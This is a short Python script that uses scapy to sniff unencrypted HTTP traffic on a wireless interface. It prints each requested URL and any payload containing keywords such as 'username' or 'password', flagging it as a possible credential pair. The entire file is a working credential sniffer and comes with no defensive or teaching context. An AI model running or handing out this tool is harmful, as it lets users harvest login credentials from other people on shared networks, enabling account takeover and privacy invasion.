#!/usr/bin/python3
import scapy.all as scapy
import scapy.layers.http as http

keywords = [
    "user","username","usr","name","usrname","uname",
    "password","pass","passwd","passwrd"
    ]

print("Scapy Imported")

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_packet)
    
def extract_url(packet):
    hostname = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    url = str(hostname + path)
    return url[2:-1]

def extract_username_password(packet):
    if packet.haslayer(scapy.Raw):
        load_field_content = str(packet[scapy.Raw].load)
        load_field_content = load_field_content[2:-1]
        for keyword in keywords:
            if keyword in load_field_content:
                return load_field_content

def process_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url = extract_url(packet)
        print(f"[+] URL >> {url}")
        username_password_combination = extract_username_password(packet)
        if username_password_combination:
            print(f"\n\n[+] Possible Username Password Combination >> {username_password_combination}\n\n")


sniff("wlan0")
